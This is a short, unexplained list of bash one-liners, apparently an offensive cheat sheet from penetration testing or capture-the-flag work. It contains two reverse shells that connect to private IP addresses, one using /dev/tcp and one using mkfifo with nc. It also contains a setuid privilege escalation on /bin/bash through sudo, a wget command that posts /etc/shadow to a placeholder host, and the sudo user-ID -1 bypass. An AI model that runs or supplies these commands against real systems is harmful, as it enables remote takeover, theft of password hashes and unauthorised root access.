```bash
/bin/bash -c 'bash -i &> /dev/tcp/10.11.43.81/1234 0<&1'
```

```bash
sudo /path/file.sh -c "chmod +s /bin/bash"
bash -p
```

```bash
sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> $port
```

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.44 1123 >/tmp/f
```

```bash
sudo -u#-1 /bin/bash
```
